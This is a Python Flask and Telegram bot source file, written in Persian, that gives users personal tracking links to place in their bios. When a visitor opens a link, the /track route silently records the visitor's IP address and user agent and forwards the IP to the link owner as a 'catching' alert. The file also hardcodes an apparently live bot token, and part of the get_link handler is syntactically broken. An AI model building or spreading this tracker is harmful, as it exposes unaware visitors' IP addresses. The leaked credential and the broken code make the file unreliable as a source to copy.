import os
import sqlite3
import random
import string
from datetime import datetime
from flask import Flask, request, redirect, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading

# ---------- تنظیمات اولیه ----------
TOKEN = "8981742192:AAHC8z6u6GifXgMIafvzv0tn_Q2LV1mM2bQ"
BASE_URL = "https://barcelona-l5tu.onrender.com"
CHANNELS = ["@film01385"]
CHANNEL_NAMES = {
    "@film01385": "کانال اول",
}

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# ---------- دیکشنری برای ذخیره پیام لینک هر کاربر ----------
user_link_messages = {}

# ---------- دیتابیس ----------
conn = sqlite3.connect("/tmp/tracker.db", check_same_thread=False)
c = conn.cursor()

c.execute("""CREATE TABLE IF NOT EXISTS users (
    telegram_id INTEGER PRIMARY KEY,
    link_code TEXT UNIQUE,
    link_full TEXT UNIQUE
)""")

c.execute("""CREATE TABLE IF NOT EXISTS clicks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    link_code TEXT,
    ip TEXT,
    user_agent TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
)""")

c.execute("""CREATE TABLE IF NOT EXISTS user_settings (
    telegram_id INTEGER PRIMARY KEY,
    capture_text TEXT,
    capture_photo_id TEXT
)""")
conn.commit()

# ---------- توابع کمکی ----------
def get_ip():
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0]
    return request.remote_addr

def generate_link(telegram_id):
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    full_link = f"{BASE_URL}/track/{code}"
    c.execute("INSERT OR REPLACE INTO users (telegram_id, link_code, link_full) VALUES (?, ?, ?)", 
              (telegram_id, code, full_link))
    conn.commit()
    return full_link

def get_user_id_by_code(code):
    c.execute("SELECT telegram_id FROM users WHERE link_code = ?", (code,))
    result = c.fetchone()
    return result[0] if result else None

def get_user_capture_text(user_id):
    c.execute("SELECT capture_text FROM user_settings WHERE telegram_id = ?", (user_id,))
    result = c.fetchone()
    return result[0] if result else "🎯 یک نفر روی لینک اختصاصی شما کلیک کرد!"

def get_user_capture_photo(user_id):
    c.execute("SELECT capture_photo_id FROM user_settings WHERE telegram_id = ?", (user_id,))
    result = c.fetchone()
    return result[0] if result else None

def save_user_settings(user_id, text=None, photo_id=None):
    c.execute("SELECT * FROM user_settings WHERE telegram_id = ?", (user_id,))
    if c.fetchone():
        if text:
            c.execute("UPDATE user_settings SET capture_text = ? WHERE telegram_id = ?", (text, user_id))
        if photo_id:
            c.execute("UPDATE user_settings SET capture_photo_id = ? WHERE telegram_id = ?", (photo_id, user_id))
    else:
        c.execute("INSERT INTO user_settings (telegram_id, capture_text, capture_photo_id) VALUES (?, ?, ?)",
                  (user_id, text, photo_id))
    conn.commit()

# ---------- بررسی عضویت ----------
def is_user_member(user_id):
    for channel in CHANNELS:
        try:
            member = bot.get_chat_member(channel, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False
        except:
            return False
    return True

# ---------- نمایش پنل کاربری ----------
def show_panel(chat_id, message_id=None):
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔗 دریافت لینک من", callback_data="get_link"))
    keyboard.add(InlineKeyboardButton("💰 خرید اشتراک پرو", callback_data="buy_sub"))
    keyboard.add(InlineKeyboardButton("🛡 خرید سپر (حفاظت و مچ‌گیری آنی)", callback_data="buy_shield"))
    keyboard.add(InlineKeyboardButton("🖼 تنظیم عکس مچ‌گیری", callback_data="set_photo"))
    keyboard.add(InlineKeyboardButton("✏️ تنظیم متن مچ‌گیری", callback_data="set_text"))
    keyboard.add(InlineKeyboardButton("📖 راهنما", callback_data="help"))
    
    text = "👋 به پنل کاربری خود خوش آمدید.\n\nلطفاً یکی از گزینه‌های زیر را انتخاب کنید:"
    
    if message_id:
        bot.edit_message_text(text, chat_id, message_id, reply_markup=keyboard)
    else:
        bot.send_message(chat_id, text, reply_markup=keyboard)

# ---------- هندلر دستور start ----------
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if is_user_member(user_id):
        show_panel(message.chat.id)
    else:
        keyboard = InlineKeyboardMarkup(row_width=1)
        
        for channel in CHANNELS:
            display_name = CHANNEL_NAMES.get(channel, channel)
            keyboard.add(InlineKeyboardButton(
                f"🔹 {display_name}", 
                url=f"https://t.me/{channel[1:]}"
            ))
        
        keyboard.add(InlineKeyboardButton("✅ عضو شدم", callback_data="check_membership"))
        
        bot.reply_to(
            message,
            "👋 **برای استفاده از ربات ابتدا در کانال های زیر عضو شوید :**",
            reply_markup=keyboard,
            parse_mode='Markdown'
        )

# ---------- هندلر دکمه‌های شیشه‌ای ----------
@bot.callback_query_handler(func=lambda call: True)
def handle_buttons(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if call.data == "check_membership":
        if is_user_member(user_id):
            bot.edit_message_text("✅ عضویت شما تأیید شد!", chat_id, call.message.message_id)
            show_panel(chat_id)
        else:
            bot.answer_callback_query(call.id, "❌ شما هنوز در همه کانال‌ها عضو نشده‌اید.", show_alert=True)
    
    elif call.data == "get_link":
        link = generate_link(user_id)
        link_code = link.split('/')[-1]
        
        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            InlineKeyboardButton("📋 کپی لینک من", callback_data=f"copy_{link_code}"),
            InlineKeyboardButton("🔒 مخفی کردن لینک", callback_data="hide_link")
        )
        
        msg = bot.edit_message_text(
            f"🔗 **لینک اختصاصی شما:**\n\n"
            f"`{link}`\n\n"

            chat_id, call.message.message_id,
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
        
        user_link_messages[user_id] = {
            "chat_id": chat_id,
            "message_id": msg.message_id,
            "link_code": link_code
        }
    
    elif call.data.startswith("copy_"):
        link_code = call.data.split("_")[1]
        link = f"{BASE_URL}/track/{link_code}"
        bot.send_message(chat_id, f"🔗 لینک اختصاصی شما برای کپی:\n\n`{link}`", parse_mode='Markdown')
        bot.answer_callback_query(call.id, "✅ لینک برای کپی ارسال شد!")
    
    elif call.data == "hide_link":
        bot.edit_message_text(
            "🔗 لینک شما مخفی شد. برای دریافت مجدد لینک، از پنل اصلی اقدام کنید.",
            chat_id, call.message.message_id
        )
        threading.Timer(2.0, lambda: show_panel(chat_id)).start()
    
    elif call.data == "buy_sub":
        bot.answer_callback_query(call.id, "💰 بخش خرید اشتراک پرو در حال توسعه است.\nبه زودی...", show_alert=True)
    
    elif call.data == "buy_shield":
        bot.answer_callback_query(call.id, "🛡 بخش خرید سپر در حال توسعه است.\nبه زودی...", show_alert=True)
    
    elif call.data == "set_photo":
        bot.edit_message_text(
            "🖼 لطفاً عکس مورد نظر خود را برای پیام مچ‌گیری ارسال کنید.\n\n"
            "پس از ارسال عکس، تنظیمات شما ذخیره می‌شود.",
            chat_id, call.message.message_id
        )
        bot.register_next_step_handler_by_chat_id(chat_id, receive_capture_photo)
    
    elif call.data == "set_text":
        bot.edit_message_text(
            "✏️ لطفاً متن مورد نظر خود را برای پیام مچ‌گیری ارسال کنید.\n\n"
            "پس از ارسال متن، تنظیمات شما ذخیره می‌شود.",
            chat_id, call.message.message_id
        )
        bot.register_next_step_handler_by_chat_id(chat_id, receive_capture_text)
    
    elif call.data == "help":
        help_text = (
            "📖 **راهنمای ربات**\n\n"
            "🔗 **دریافت لینک من**: لینک اختصاصی خود را دریافت کنید.\n"
            "💰 **اشتراک پرو**: با تهیه اشتراک، امکانات بیشتری در اختیار دارید.\n"
            "🛡 **سپر**: از شما در برابر کلیک روی لینک‌های دیگران محافظت می‌کند.\n"
            "🖼 **تنظیم عکس**: عکس دلخواه خود را برای پیام مچ‌گیری تنظیم کنید.\n"
            "✏️ **تنظیم متن**: متن دلخواه خود را برای پیام مچ‌گیری تنظیم کنید.\n\n"
            "⚡ توجه: این ربات اطلاعات بازدید از پروفایل را نشان نمی‌دهد، بلکه فقط کلیک روی لینک را ثبت می‌کند."
        )
        bot.edit_message_text(help_text, chat_id, call.message.message_id, parse_mode='Markdown')
        threading.Timer(5.0, lambda: show_panel(chat_id, call.message.message_id)).start()

# ---------- دریافت متن مچ‌گیری ----------
def receive_capture_text(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    text = message.text
    
    save_user_settings(user_id, text=text)
    bot.send_message(chat_id, f"✅ متن مچ‌گیری شما با موفقیت ذخیره شد:\n\n{text}")
    show_panel(chat_id)

# ---------- دریافت عکس مچ‌گیری ----------
def receive_capture_photo(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if message.photo:
        photo_id = message.photo[-1].file_id
        save_user_settings(user_id, photo_id=photo_id)
        bot.send_message(chat_id, "✅ عکس مچ‌گیری شما با موفقیت ذخیره شد.")
    else:
        bot.send_message(chat_id, "❌ لطفاً یک عکس معتبر ارسال کنید.")
    
    show_panel(chat_id)

# ========== مسیرهای Flask ==========
@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        json_str = request.get_data().decode('UTF-8')
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/track/<code>')
def track_click(code):
    user_a_id = get_user_id_by_code(code)
    ip_address = get_ip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    c.execute("INSERT INTO clicks (link_code, ip, user_agent) VALUES (?, ?, ?)", 
              (code, ip_address, user_agent))
    conn.commit()
    
    if user_a_id and user_a_id in user_link_messages:
        msg_info = user_link_messages[user_a_id]
        try:
            capture_text = get_user_capture_text(user_a_id)
            bot.edit_message_text(
                f"🔗 لینک اختصاصی شما:\n\n{msg_info['link_code']}\n\n"
                "این لینک را در بیوگرافی خود قرار دهید.\n\n"
                f"🎯 **{capture_text}**\n"
                f"📅 زمان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                msg_info["chat_id"], msg_info["message_id"]
            )
        except Exception as e:
            print(f"Error updating message: {e}")
    
    if user_a_id:
        try:
            capture_text = get_user_capture_text(user_a_id)
            capture_photo = get_user_capture_photo(user_a_id)
            
            if capture_photo:
                bot.send_photo(
                    user_a_id,
                    capture_photo,
                    caption=f"🎯 {capture_text}\n\n📅 زمان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n🌐 IP: {ip_address}"
                )
            else:
                bot.send_message(
                    user_a_id,
                    f"🎯 {capture_text}\n\n📅 زمان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n🌐 IP: {ip_address}"
                )
        except Exception as e:
            print(f"Error sending to {user_a_id}: {e}")
    
    return redirect("https://t.me/your_channel", code=302)

@app.route('/health', methods=['GET'])
def health():
    return "OK", 200

@app.route('/', methods=['GET'])
def index():
    return "ربات آنلاین است", 200

def set_webhook():
    webhook_url = f"{BASE_URL}/webhook"
    result = bot.set_webhook(url=webhook_url)
    if result:
        print(f"✅ Webhook set: {webhook_url}")
    else:
        print("❌ Failed to set webhook")

if __name__ == '__main__':
    set_webhook()
    app.run(host='0.0.0.0', port=10000)
